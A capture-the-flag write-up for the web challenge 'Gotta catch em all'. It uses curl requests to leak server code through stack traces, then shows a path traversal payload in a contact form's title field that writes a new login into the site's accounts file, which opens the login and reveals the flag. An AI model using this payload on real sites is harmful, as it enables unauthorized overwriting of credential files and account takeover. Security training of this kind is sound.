# Gotta catch em all
Category: Web, 80 Points

## Description

> Ash was too busy catching pokemons that he forgot his credentials.


## Solution

The attached website contained four pages, and two of them contained forms.

The first form was a login form:
```html
<form action="/login" method="post">
    <input placeholder="username" size="20" name="username"></input><br>
    <input placeholder="password" size="20" name="password"></input><br><br>
    <input type="submit" class="button" value="Submit">
</form>
```

The second, a "Contact Me" page:
```html
<form action="/messageSent" method="post">
    <textarea rows="1", cols="80" placeholder="Title" name="title"></textarea><br><br>
    <textarea rows="20" cols="80" placeholder="Body" name="body"></textarea><br>
    <input type="submit" class="button" value="Submit">
</form>
```

Let's start with the login page. We'll send a long username:
```console
root@kali:/media/sf_CTFs/matrix/Gotta_catch_em_all# curl 'https://ashmatd.herokuapp.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=aaaaaaaaaaaaaaaaaaaaa&password=b'
```

As a response, we get a Python stack trace which leaks the login handler:
```python
@app.route('/login', methods=["POST"])

def login_attempt():
        username = request.form['username']
        password = request.form['password']

        if len(username) > 20 or len(password) > 20:
                raise Exception("Given username/password is too big")

        with open(HOME + 'private/accounts.txt') as f:
                accounts_data = f.readlines()

        accounts = {account.split(': ')[0]: account.split(': ')[1] for account in accounts_data}
        if username in accounts and accounts[username] == password:
                #Success

```

We can see that the username and password come from a file called `private/accounts.txt` where they are stored the format: `username: password`.

Now, let's try the same trick on the "Contact Me" form:
```console
root@kali:/media/sf_CTFs/matrix/Gotta_catch_em_all# curl 'https://ashmatd.herokuapp.com/messageSent' -H 'Content-Type: application/x-www-form-urlencoded' --data 'title=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&body=b'
```

Again, we get a code leak via the stack trace:
```python
File "/app/app.py", line 25, in post_message
        body = str(request.form['body'])
        title = title.translate(None, ':*?"<>|')
        if len(title) == 0:
                title = "default title"

        if len(request.form['title']) > 30:
                raise Exception("Given title is too big")

        with open(HOME + 'messages/{}.txt'.format(title), "a+") as f:
                f.write(body)

        return render_template('message sent.html')
```

So now we know that the message is saved under `'messages/{}.txt'.format(title)`. Looks like all we need to do is override the accounts database using a specially crafted title:
```console
root@kali:/media/sf_CTFs/matrix/Gotta_catch_em_all# curl 'https://ashmatd.herokuapp.com/messageSent' -H 'Content-Type: application/x-www-form-urlencoded' --data 'title=../private/accounts&body=open: sesame'
<!DOCTYPE html>
<html>
<head>
<title>message sent - Ash's site</title>
<link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>

<h1>Message Sent Successfully</h1>
<h3>I will read it as soon as possible</h3>
<form action="/" method="get">
<input type="submit" class="button" value="home">
</form>
</body>
</html>
```

This will override:
```python
>>> 'messages/{}.txt'.format('../private/accounts')
'messages/../private/accounts.txt'
```

Now we try to login using the username and password we used in the message body:
```console
root@kali:/media/sf_CTFs/matrix/Gotta_catch_em_all# curl 'https://ashmatd.herokuapp.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=open&password=sesame'
<!DOCTYPE html>
<html>
<head>
<title>congradulations - Ash's site</title>
<style>
body {
  background-color: #fc03ca;
  text-align: center;
  color: white;
  font-family: Arial, Helvetica, sans-serif;
}

</style>
</head>
<body>

<h1 style="color:blue">congratulations!!!!</h1>
<h2 style="color:green">Here is your Flag...</h2>
<h1>FLAG_aSh_Ketchup</h1>
</body>
</html>
```

We got the flag.